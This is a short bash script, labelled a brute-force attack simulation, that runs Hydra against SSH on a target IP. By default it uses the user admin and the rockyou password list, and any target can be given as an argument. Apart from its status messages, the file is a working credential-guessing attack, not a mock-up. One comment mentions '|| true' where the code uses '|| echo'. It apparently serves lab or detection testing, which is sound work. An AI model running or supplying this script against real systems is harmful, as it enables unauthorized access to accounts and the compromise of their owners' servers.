#!/bin/bash

# Simulate brute force attack using Hydra

TARGET_USER=${1:-"admin"}
TARGET_IP=${2:-"192.168.1.100"}
WORDLIST=${3:-"/usr/share/wordlists/rockyou.txt"}

echo "[*] Starting Brute Force attack simulation on $TARGET_IP for user $TARGET_USER..."
echo "[*] Using wordlist: $WORDLIST"

# Run Hydra (added || true so script doesn't completely fail if hydra isn't installed during simulation)
hydra -l "$TARGET_USER" -P "$WORDLIST" ssh://"$TARGET_IP" || echo "[!] Hydra command failed or not installed. Simulation logged."

echo "[*] Brute Force attack simulation executed"
